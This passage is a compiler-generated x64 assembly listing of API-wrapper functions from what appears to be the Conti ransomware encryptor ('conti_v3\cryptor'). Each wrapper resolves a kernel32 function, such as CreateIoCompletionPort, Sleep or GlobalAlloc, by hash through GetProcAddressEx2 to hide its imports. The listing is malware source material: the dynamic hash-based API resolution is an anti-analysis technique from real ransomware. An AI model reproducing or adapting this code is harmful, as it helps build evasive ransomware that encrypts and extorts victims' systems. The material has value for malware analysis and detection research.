  0001b	41 b9 40 00 00
	00		 mov	 r9d, 64			; 00000040H
  00021	41 b8 60 67 1a
	07		 mov	 r8d, 119170912		; 071a6760H
  00027	ba 0f 00 00 00	 mov	 edx, 15
  0002c	33 c9		 xor	 ecx, ecx
  0002e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00033	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 515  : 	return pFunction();

  00037	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 516  : }

  0003a	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?pCreateTimerQueue@@YAPEAXXZ ENDP			; pCreateTimerQueue
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z
_TEXT	SEGMENT
pFunction$ = 8
FileHandle$ = 256
ExistingCompletionPort$ = 264
CompletionKey$ = 272
NumberOfConcurrentThreads$ = 280
?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z PROC		; pCreateIoCompletionPort, COMDAT

; 505  : {

$LN3:
  00000	44 89 4c 24 20	 mov	 DWORD PTR [rsp+32], r9d
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 506  : 	HANDLE(WINAPI * pFunction)(HANDLE, HANDLE, ULONG_PTR, DWORD);
; 507  : 	pFunction = (HANDLE(WINAPI*)(HANDLE, HANDLE, ULONG_PTR, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xac9084f4, 65);//GetProcAddress(hKernel32, OBFA("CreateIoCompletionPort"));

  0002e	41 b9 41 00 00
	00		 mov	 r9d, 65			; 00000041H
  00034	41 b8 f4 84 90
	ac		 mov	 r8d, -1399814924	; ac9084f4H
  0003a	ba 0f 00 00 00	 mov	 edx, 15
  0003f	33 c9		 xor	 ecx, ecx
  00041	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00046	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 508  : 	return pFunction(FileHandle, ExistingCompletionPort, CompletionKey, NumberOfConcurrentThreads);

  0004a	44 8b 8d 18 01
	00 00		 mov	 r9d, DWORD PTR NumberOfConcurrentThreads$[rbp]
  00051	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR CompletionKey$[rbp]
  00058	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR ExistingCompletionPort$[rbp]
  0005f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR FileHandle$[rbp]
  00066	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 509  : }

  00069	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00070	5f		 pop	 rdi
  00071	5d		 pop	 rbp
  00072	c3		 ret	 0
?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z ENDP		; pCreateIoCompletionPort
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
_TEXT	SEGMENT
pFunction$ = 8
lpCriticalSection$ = 256
?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z PROC ; pDeleteCriticalSection, COMDAT

; 493  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 494  : 	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
; 495  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x22d94276, 66);//GetProcAddress(hKernel32, OBFA("DeleteCriticalSection"));

  0001f	41 b9 42 00 00
	00		 mov	 r9d, 66			; 00000042H
  00025	41 b8 76 42 d9
	22		 mov	 r8d, 584663670		; 22d94276H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 496  : 	return pFunction(lpCriticalSection);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpCriticalSection$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 497  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ENDP ; pDeleteCriticalSection
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGlobalFree@@YAPEAXPEAX@Z
_TEXT	SEGMENT
pFunction$ = 8
hMem$ = 256
?pGlobalFree@@YAPEAXPEAX@Z PROC				; pGlobalFree, COMDAT

; 484  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 485  : 	HGLOBAL(WINAPI * pFunction)(HGLOBAL);
; 486  : 	pFunction = (HGLOBAL(WINAPI*)(HGLOBAL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8d87ce2b, 67);//GetProcAddress(hKernel32, OBFA("GlobalFree"));

  0001f	41 b9 43 00 00
	00		 mov	 r9d, 67			; 00000043H
  00025	41 b8 2b ce 87
	8d		 mov	 r8d, -1920479701	; 8d87ce2bH
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 487  : 	return pFunction(hMem);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hMem$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 488  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pGlobalFree@@YAPEAXPEAX@Z ENDP				; pGlobalFree
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGlobalAlloc@@YAPEAXI_K@Z
_TEXT	SEGMENT
pFunction$ = 8
uFlags$ = 256
dwBytes$ = 264
?pGlobalAlloc@@YAPEAXI_K@Z PROC				; pGlobalAlloc, COMDAT

; 475  : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 476  : 	HGLOBAL(WINAPI * pFunction)(UINT, SIZE_T);
; 477  : 	pFunction = (HGLOBAL(WINAPI*)(UINT, SIZE_T))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb2eb0cd3, 68);//GetProcAddress(hKernel32, OBFA("GlobalAlloc"));

  00023	41 b9 44 00 00
	00		 mov	 r9d, 68			; 00000044H
  00029	41 b8 d3 0c eb
	b2		 mov	 r8d, -1293218605	; b2eb0cd3H
  0002f	ba 0f 00 00 00	 mov	 edx, 15
  00034	33 c9		 xor	 ecx, ecx
  00036	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003b	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 478  : 	return pFunction(uFlags, dwBytes);

  0003f	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR dwBytes$[rbp]
  00046	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR uFlags$[rbp]
  0004c	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 479  : }

  0004f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00056	5f		 pop	 rdi
  00057	5d		 pop	 rbp
  00058	c3		 ret	 0
?pGlobalAlloc@@YAPEAXI_K@Z ENDP				; pGlobalAlloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pSleep@@YAXK@Z
_TEXT	SEGMENT
pFunction$ = 8
dwMilliseconds$ = 256
?pSleep@@YAXK@Z PROC					; pSleep, COMDAT

; 465  : {

$LN3:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 466  : 	void(WINAPI * pFunction)(DWORD);
; 467  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb09422e9, 69);//GetProcAddress(hKernel32, OBFA("Sleep"));

  0001e	41 b9 45 00 00
	00		 mov	 r9d, 69			; 00000045H
  00024	41 b8 e9 22 94
	b0		 mov	 r8d, -1332469015	; b09422e9H
  0002a	ba 0f 00 00 00	 mov	 edx, 15
  0002f	33 c9		 xor	 ecx, ecx
  00031	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00036	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 468  : 	return pFunction(dwMilliseconds);

  0003a	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR dwMilliseconds$[rbp]
  00040	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 469  : }

  00043	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
?pSleep@@YAXK@Z ENDP					; pSleep
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z
_TEXT	SEGMENT
pFunction$ = 8
CompletionPort$ = 256
dwNumberOfBytesTransferred$ = 264
dwCompletionKey$ = 272
lpOverlapped$ = 280
?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z PROC ; pPostQueuedCompletionStatus, COMDAT

; 456  : {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  0000e	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00013	55		 push	 rbp
  00014	57		 push	 rdi
  00015	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0001c	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00021	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00028	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 457  : 	BOOL(WINAPI * pFunction)(HANDLE, DWORD, ULONG_PTR, LPOVERLAPPED);
; 458  : 	pFunction = (BOOL(WINAPI*)(HANDLE, DWORD, ULONG_PTR, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x442d716b, 70);//GetProcAddress(hKernel32, OBFA("PostQueuedCompletionStatus"));

  0002d	41 b9 46 00 00
	00		 mov	 r9d, 70			; 00000046H
  00033	41 b8 6b 71 2d
	44		 mov	 r8d, 1143828843		; 442d716bH
  00039	ba 0f 00 00 00	 mov	 edx, 15
  0003e	33 c9		 xor	 ecx, ecx
  00040	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00045	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 459  : 	return pFunction(CompletionPort, dwNumberOfBytesTransferred, dwCompletionKey, lpOverlapped);

  00049	4c 8b 8d 18 01
	00 00		 mov	 r9, QWORD PTR lpOverlapped$[rbp]
  00050	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR dwCompletionKey$[rbp]
  00057	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR dwNumberOfBytesTransferred$[rbp]
  0005d	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR CompletionPort$[rbp]
  00064	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 460  : }

  00067	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0006e	5f		 pop	 rdi
  0006f	5d		 pop	 rbp
  00070	c3		 ret	 0
?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z ENDP ; pPostQueuedCompletionStatus
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pExitThread@@YAXK@Z
_TEXT	SEGMENT
pFunction$ = 8
dwExitCode$ = 256
?pExitThread@@YAXK@Z PROC				; pExitThread, COMDAT

; 443  : {

$LN3:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 444  : 	void(WINAPI * pFunction)(DWORD);
; 445  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa7be41e8, 71);//GetProcAddress(hKernel32, OBFA("ExitThread"));

  0001e	41 b9 47 00 00
	00		 mov	 r9d, 71			; 00000047H
  00024	41 b8 e8 41 be
	a7		 mov	 r8d, -1480703512	; a7be41e8H
  0002a	ba 0f 00 00 00	 mov	 edx, 15
  0002f	33 c9		 xor	 ecx, ecx
  00031	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00036	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 446  : 	return pFunction(dwExitCode);

  0003a	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR dwExitCode$[rbp]
  00040	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 447  : }

  00043	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
?pExitThread@@YAXK@Z ENDP				; pExitThread
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z
_TEXT	SEGMENT
pFunction$ = 8
CompletionPort$ = 256
lpNumberOfBytesTransferred$ = 264
lpCompletionKey$ = 272
lpOverlapped$ = 280
dwMilliseconds$ = 288
?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z PROC ; pGetQueuedCompletionStatus, COMDAT

; 434  : {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0001d	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 435  : 	BOOL(WINAPI * pFunction)(HANDLE, LPDWORD, PULONG_PTR, LPOVERLAPPED*, DWORD);
; 436  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPDWORD, PULONG_PTR, LPOVERLAPPED*, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa86380c7, 72);//GetProcAddress(hKernel32, OBFA("GetQueuedCompletionStatus"));

  0002e	41 b9 48 00 00
	00		 mov	 r9d, 72			; 00000048H
  00034	41 b8 c7 80 63
	a8		 mov	 r8d, -1469873977	; a86380c7H
  0003a	ba 0f 00 00 00	 mov	 edx, 15
  0003f	33 c9		 xor	 ecx, ecx
  00041	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00046	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 437  : 	return pFunction(CompletionPort, lpNumberOfBytesTransferred, lpCompletionKey, lpOverlapped, dwMilliseconds);

  0004a	8b 85 20 01 00
	00		 mov	 eax, DWORD PTR dwMilliseconds$[rbp]
  00050	89 44 24 20	 mov	 DWORD PTR [rsp+32], eax
  00054	4c 8b 8d 18 01
	00 00		 mov	 r9, QWORD PTR lpOverlapped$[rbp]
  0005b	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR lpCompletionKey$[rbp]
  00062	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpNumberOfBytesTransferred$[rbp]
  00069	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR CompletionPort$[rbp]
  00070	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 438  : }

  00073	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0007a	5f		 pop	 rdi
  0007b	5d		 pop	 rbp
  0007c	c3		 ret	 0
?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z ENDP ; pGetQueuedCompletionStatus
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
_TEXT	SEGMENT
pFunction$ = 8
lpCriticalSection$ = 256
?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z PROC ; pInitializeCriticalSection, COMDAT

; 421  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 422  : 	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  0001f	41 b9 49 00 00
	00		 mov	 r9d, 73			; 00000049H
  00025	41 b8 d3 40 de
	dd		 mov	 r8d, -572636973		; ddde40d3H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 424  : 	return pFunction(lpCriticalSection);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpCriticalSection$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 425  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ENDP ; pInitializeCriticalSection
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
_TEXT	SEGMENT
pFunction$ = 8
lpCriticalSection$ = 256
?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z PROC ; pLeaveCriticalSection, COMDAT

; 412  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 413  : 	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  0001f	41 b9 4a 00 00
	00		 mov	 r9d, 74			; 0000004aH
  00025	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 415  : 	return pFunction(lpCriticalSection);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpCriticalSection$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 416  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ENDP ; pLeaveCriticalSection
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pDeleteTimerQueue@@YAHPEAX@Z
_TEXT	SEGMENT
pFunction$ = 8
TimerQueue$ = 256
?pDeleteTimerQueue@@YAHPEAX@Z PROC			; pDeleteTimerQueue, COMDAT

; 403  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 404  : 	BOOL(WINAPI * pFunction)(HANDLE);
; 405  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x6998a9d3, 75);//GetProcAddress(hKernel32, OBFA("DeleteTimerQueue"));

  0001f	41 b9 4b 00 00
	00		 mov	 r9d, 75			; 0000004bH
  00025	41 b8 d3 a9 98
	69		 mov	 r8d, 1771612627		; 6998a9d3H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 406  : 	return pFunction(TimerQueue);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR TimerQueue$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 407  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pDeleteTimerQueue@@YAHPEAX@Z ENDP			; pDeleteTimerQueue
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
_TEXT	SEGMENT
pFunction$ = 8
lpCriticalSection$ = 256
?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z PROC ; pEnterCriticalSection, COMDAT

; 394  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 395  : 	VOID(WINAPI * pFunction)(LPCRITICAL_SECTION);
; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  0001f	41 b9 4c 00 00
	00		 mov	 r9d, 76			; 0000004cH
  00025	41 b8 49 37 2c
	4f		 mov	 r8d, 1328297801		; 4f2c3749H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 397  : 	return pFunction(lpCriticalSection);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpCriticalSection$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 398  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ENDP ; pEnterCriticalSection
